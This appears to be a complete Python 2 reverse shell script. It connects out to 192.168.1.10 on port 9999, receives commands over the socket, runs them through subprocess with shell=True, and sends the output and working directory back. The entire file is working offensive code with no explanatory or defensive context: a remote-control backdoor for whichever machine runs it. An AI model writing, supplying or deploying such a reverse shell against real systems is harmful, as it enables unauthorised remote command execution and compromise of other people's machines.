#!/usr/bin/env python

import subprocess
import socket
import os

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.1.10",9999))
	while True:
		output=""
		data = s.recv(1024)
		if data == "exit":
			s.close()
			exit()
		if data[:2] == "cd":
			#s.send(subprocess.call(data,shell=True))
			os.chdir(data[3:])
		if len(data) > 0:
			cmd = subprocess.Popen(data,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE,shell=True)
			output = cmd.stdout.read() + cmd.stderr.read()
		s.send(output+os.getcwd())
		# response = subprocess.Popen(str(cmd),stdout=subprocess.PIPE)
except socket.error:
	print("Exit")